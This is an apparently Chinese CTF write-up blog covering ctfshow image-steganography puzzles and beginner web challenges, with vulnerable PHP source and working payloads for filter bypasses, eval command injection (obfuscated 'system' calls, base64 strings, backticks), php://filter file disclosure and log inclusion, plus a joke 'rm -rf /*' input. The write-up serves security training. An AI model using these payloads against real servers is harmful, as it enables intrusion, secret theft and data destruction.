<h2 id="1-35-misc34-—-出题人狗急跳墙，把IHDR块的CRC也改了，但我们知道正确宽度肯定大于900"><a href="#1-35-misc34-—-出题人狗急跳墙，把IHDR块的CRC也改了，但我们知道正确宽度肯定大于900" class="headerlink" title="1.35 misc34 — 出题人狗急跳墙，把IHDR块的CRC也改了，但我们知道正确宽度肯定大于900"></a>1.35 misc34 — 出题人狗急跳墙，把IHDR块的CRC也改了，但我们知道正确宽度肯定大于900</h2><h2 id="1-36-misc35"><a href="#1-36-misc35" class="headerlink" title="1.36 misc35"></a>1.36 misc35</h2><h2 id="1-37-misc36"><a href="#1-37-misc36" class="headerlink" title="1.37 misc36"></a>1.37 misc36</h2><h2 id="1-38-misc37-—-flag在图片里"><a href="#1-38-misc37-—-flag在图片里" class="headerlink" title="1.38 misc37 — flag在图片里"></a>1.38 misc37 — flag在图片里</h2><p>StegSolve 帧图分析</p>
<p>ctfshow{2056782cd57b13261dcbbe3d6eecda17}</p>
<p><img src="https://i.loli.net/2021/08/18/GK4Qjsxu1ombFEe.png" alt="image-20210818133303136"></p>
<h2 id="1-39-misc38-—-flag在图片里"><a href="#1-39-misc38-—-flag在图片里" class="headerlink" title="1.39 misc38 — flag在图片里"></a>1.39 misc38 — flag在图片里</h2><p><img src="https://i.loli.net/2021/08/18/lUidvS8bGcwmC6z.png" alt="image-20210818133639020"></p>
<p>使用浏览器打开，即可发现会动</p>
<p><img src="https://i.loli.net/2021/08/18/OmIx2Yf9HSnqTzk.png" alt="image-20210818133736905"></p>
<p><a href="http://www.downcc.com/soft/40902.html">APNG 图片分解器</a></p>
<p>ctfshow{48b722b570c603ef58cc0b83bbf7680d}</p>
<h2 id="1-40-misc39-—-flag就像水，忽快忽慢地流"><a href="#1-40-misc39-—-flag就像水，忽快忽慢地流" class="headerlink" title="1.40 misc39 — flag就像水，忽快忽慢地流"></a>1.40 misc39 — flag就像水，忽快忽慢地流</h2><p>这题也是一个gif，不过这里是利用<code>不同帧之间的间隔时间</code>来隐写的。</p>
<h2 id="1-41-misc40-—-flag就像歌，有长有短仿佛岁月悠悠"><a href="#1-41-misc40-—-flag就像歌，有长有短仿佛岁月悠悠" class="headerlink" title="1.41 misc40 — flag就像歌，有长有短仿佛岁月悠悠"></a>1.41 misc40 — flag就像歌，有长有短仿佛岁月悠悠</h2><p>apng</p>
<p>帧分离，换成了apng的帧时间间隔隐写</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag=<span class="string">&quot;&quot;</span><span class="keyword">for</span> i <span class="keyword">in</span> range(28,69): <span class="comment">#flag内容从28位开始    f = open(&#x27;apngframe&#x27;+str(i)+&#x27;.txt&#x27;)    s = f.read()    flag += chr(int(s.split(&quot;/&quot;)[0][6:]))print(flag)</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/18/PIZ4l9SsAREOBUF.png" alt="image-20210818135910351"></p>
]]></content>
      <categories>
        <category>CTF Show</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-Show-萌新计划</title>
    <url>/2021/11/19/CTF-Show-%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="CTF-Show-—-萌新计划"><a href="#CTF-Show-—-萌新计划" class="headerlink" title="CTF Show — 萌新计划"></a>CTF Show — 萌新计划</h1><p>Web 1-7</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//<span class="built_in">echo</span> intval(<span class="string">&#x27;1000&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(intval(<span class="variable">$a</span>) &gt; 999 )&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进制转换</span></span><br><span class="line">0x38e			<span class="comment">#十六进制</span></span><br><span class="line">0b1111101000	<span class="comment"># 二进制</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 取反 异或 与运算</span></span><br><span class="line">~~1000</span><br><span class="line">200^800</span><br><span class="line">992|8</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 运算符</span></span><br><span class="line">200*5</span><br><span class="line">10/0.01</span><br><span class="line">--1000</span><br><span class="line">200%2b800</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sql 注入</span></span><br><span class="line">?id=1 or 1=1</span><br><span class="line">id=id<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=(1000)</span><br><span class="line">?id=<span class="string">&#x27;1000&#x27;</span></span><br><span class="line">?id=<span class="string">&quot;1000&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web 1"></a>Web 1</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># 包含数据库连接文件</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="comment"># 判断get提交的参数id是否存在</span></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="comment"># 判断id的值是否大于999</span></span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$id</span>) &gt; 999)&#123;</span><br><span class="line">        <span class="comment"># id 大于 999 直接退出并返回错误</span></span><br><span class="line">        die(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment"># id 小于 999 拼接sql语句</span></span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from article where id = <span class="variable">$id</span> order by id limit 1 &quot;</span>;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;执行的sql为：<span class="variable">$sql</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="comment"># 执行sql 语句</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="comment"># 判断有没有查询结果</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">            <span class="comment"># 如果有结果，获取结果对象的值$row</span></span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc()) &#123;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;id: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>]. <span class="string">&quot; - title: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;title&quot;</span>]. <span class="string">&quot; &lt;br&gt;&lt;hr&gt;&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;content&quot;</span>]. <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 关闭数据库连接</span></span><br><span class="line">        <span class="variable">$conn</span>-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;!-- flag <span class="keyword">in</span> id = 1000 --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>需要满足 intval($id) &lt;= 999 , 但又要 id = 1000</p>
<p>测试</p>
<p><img src="https://i.loli.net/2021/08/16/au6swWVp8t4bKm5.png" alt="image-20210816155514366"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=<span class="string">&quot;1000&quot;</span></span><br><span class="line">?id=<span class="string">&#x27;1000&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/14/sLFV7bO5RuzCmXH.png" alt="image-20210814231236552"></p>
<p><strong>其它绕过方式：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=0x3e8  <span class="comment"># 数据库中查询可使用 十六进制</span></span><br><span class="line">select * from article <span class="built_in">where</span> id = 0x3e8 order by id <span class="built_in">limit</span> 1</span><br><span class="line"></span><br><span class="line">?id=125&lt;&lt;<span class="string">3	# 不知</span></span><br><span class="line"><span class="string">?id=680|320	# 不知</span></span><br></pre></td></tr></table></figure>

<h2 id="Web-2"><a href="#Web-2" class="headerlink" title="Web 2"></a>Web 2</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=<span class="string">&quot;1000&quot;</span></span><br><span class="line">?id=<span class="string">&#x27;1000&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Web-3"><a href="#Web-3" class="headerlink" title="Web 3"></a>Web 3</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=<span class="string">&quot;1000&quot;</span></span><br><span class="line">?id=<span class="string">&#x27;1000&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Web-4"><a href="#Web-4" class="headerlink" title="Web 4"></a>Web 4</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=<span class="string">&quot;1000&quot;</span></span><br><span class="line">?id=<span class="string">&#x27;1000&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="Web-5"><a href="#Web-5" class="headerlink" title="Web 5"></a>Web 5</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i&quot;</span>,<span class="variable">$id</span>))</span><br></pre></td></tr></table></figure>

<p>过滤引号</p>
<p><strong>取反绕过</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=~~1000</span><br></pre></td></tr></table></figure>

<p><strong>异或绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0^0 = 0</span><br><span class="line">1^0 = 1</span><br><span class="line">0^1 = 1</span><br><span class="line">1^1 = 0</span><br><span class="line">即同为假，异为真</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=</span><br></pre></td></tr></table></figure>

<p><strong>二进制绕过</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=0b1111101000	<span class="comment"># 0b 开头表示二进制</span></span><br></pre></td></tr></table></figure>

<h2 id="Web-6"><a href="#Web-6" class="headerlink" title="Web 6"></a>Web 6</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|x|hex|\(|\)|\+|select/i&quot;</span>,<span class="variable">$id</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=0b1111101000	<span class="comment"># 0b 开头表示二进制</span></span><br></pre></td></tr></table></figure>

<h2 id="Web-7"><a href="#Web-7" class="headerlink" title="Web 7"></a>Web 7</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|or|\||\-|\\\|\/|\\*|\&lt;|\&gt;|\^|\!|\~|x|hex|\(|\)|\+|select/i&quot;</span>,<span class="variable">$id</span>))</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?id=0b1111101000	<span class="comment"># 0b 开头表示二进制</span></span><br></pre></td></tr></table></figure>

<h2 id="Web-8-—-flag-rm-rf"><a href="#Web-8-—-flag-rm-rf" class="headerlink" title="Web 8 — ?flag=rm -rf /*"></a>Web 8 — ?flag=rm -rf /*</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># 包含数据库连接文件,key flag 也在里面定义</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="comment"># 判断get提交的参数id是否存在</span></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">                <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="variable">$f</span>)&#123;</span><br><span class="line">                        <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?flag=rm -rf /*</span><br></pre></td></tr></table></figure>

<h2 id="Web-9"><a href="#Web-9" class="headerlink" title="Web 9"></a>Web 9</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/system|exec|highlight/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="built_in">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?c=highlight_file(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">?c=system(<span class="string">&#x27;cat config.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="Web-10"><a href="#Web-10" class="headerlink" title="Web 10"></a>Web 10</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="built_in">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?c=show_source(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">?c=<span class="variable">$a</span>=<span class="string">&#x27;sys&#x27;</span>;<span class="variable">$b</span>=<span class="string">&#x27;tem&#x27;</span>;<span class="variable">$d</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;<span class="variable">$d</span>(<span class="string">&#x27;cat config.php&#x27;</span>);</span><br><span class="line">?c=passthru(<span class="string">&#x27;cat config.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="Web-11"><a href="#Web-11" class="headerlink" title="Web 11"></a>Web 11</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="built_in">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?c=show_source(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">?c=<span class="variable">$a</span>=<span class="string">&#x27;sys&#x27;</span>;<span class="variable">$b</span>=<span class="string">&#x27;tem&#x27;</span>;<span class="variable">$d</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;<span class="variable">$d</span>(<span class="string">&#x27;tac config.php&#x27;</span>);</span><br><span class="line">?c=passthru(<span class="string">&#x27;tac config.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="Web-12"><a href="#Web-12" class="headerlink" title="Web 12"></a>Web 12</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat|\.|php|config/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="built_in">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?c=passthru(<span class="string">&#x27;tac confi*&#x27;</span>);</span><br><span class="line">?c=passthru(<span class="string">&#x27;tac con&quot;&quot;fig*&#x27;</span>);</span><br><span class="line">?c=passthru(<span class="string">&#x27;tac con\fig*&#x27;</span>);</span><br><span class="line">?c=<span class="variable">$a</span>=base64_decode(<span class="string">&quot;c3lzdGVt&quot;</span>);<span class="variable">$b</span>=base64_decode(<span class="string">&quot;Y2F0IGNvbmZpZy5waHA=&quot;</span>);<span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">#system(&#x27;cat config.php&#x27;);</span></span><br></pre></td></tr></table></figure>

<h2 id="Web-13-—-过滤-；"><a href="#Web-13-—-过滤-；" class="headerlink" title="Web 13 — 过滤 ；"></a>Web 13 — 过滤 ；</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat|\.|\;|file|php|config/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="built_in">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>过滤了 分号 ;</strong>    </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># include + 伪协议</span></span><br><span class="line">?c=include<span class="variable">$_GET</span>[1]?&gt;&amp;1=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=config.php</span><br><span class="line"><span class="comment"># ?&gt; 闭合</span></span><br><span class="line">?c=passthru(<span class="string">&#x27;tac con\fig*&#x27;</span>)?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Web-14"><a href="#Web-14" class="headerlink" title="Web 14"></a>Web 14</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|exec|highlight|cat|\(|\.|\;|file|php|config/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="built_in">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># include + 伪协议</span></span><br><span class="line">?c=include<span class="variable">$_GET</span>[1]?&gt;&amp;1=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=config.php</span><br><span class="line"></span><br><span class="line">?c=<span class="built_in">echo</span> `<span class="variable">$_GET</span>[a]`?&gt;&amp;a=tac config.php</span><br></pre></td></tr></table></figure>

<h2 id="Web-15-—-过滤"><a href="#Web-15-—-过滤" class="headerlink" title="Web 15 — 过滤 ?"></a>Web 15 — 过滤 ?</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/system|\\*|\?|\&lt;|\&gt;|\=|exec|highlight|cat|\(|\.|file|php|config/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="built_in">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>过滤问号 ?</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?c=<span class="built_in">echo</span> `<span class="variable">$_GET</span>[a]`;&amp;a=tac config.php</span><br><span class="line">?c=include<span class="variable">$_GET</span>[1];&amp;1=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=config.php</span><br></pre></td></tr></table></figure>

<h2 id="Web-16"><a href="#Web-16" class="headerlink" title="Web 16"></a>Web 16</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line">include(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="string">&quot;ctfshow<span class="variable">$c</span>&quot;</span>)===<span class="string">&quot;a6f57ae38a22448c2f07f3f95f49c84e&quot;</span>)&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;nonono!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">str1=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> str1:</span><br><span class="line">            s = hashlib.md5((<span class="string">&#x27;ctfshow&#x27;</span>+i+j+k).encode()).hexdigest()</span><br><span class="line">            <span class="comment">#print(type(s))</span></span><br><span class="line">            <span class="keyword">if</span> s==<span class="string">&#x27;a6f57ae38a22448c2f07f3f95f49c84e&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(i+j+k)</span><br></pre></td></tr></table></figure>

<p>得到 36d</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?c=36d</span><br></pre></td></tr></table></figure>

<h2 id="Web-17-21-—-日志包含"><a href="#Web-17-21-—-日志包含" class="headerlink" title="Web 17-21 — 日志包含"></a>Web 17-21 — 日志包含</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">       <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">       <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">               include(<span class="variable">$c</span>);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>日志包含</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?c=/var/<span class="built_in">log</span>/nginx/access.log</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/16/rN8xalpn9bUyQYC.png" alt="image-20210816170943818"></p>
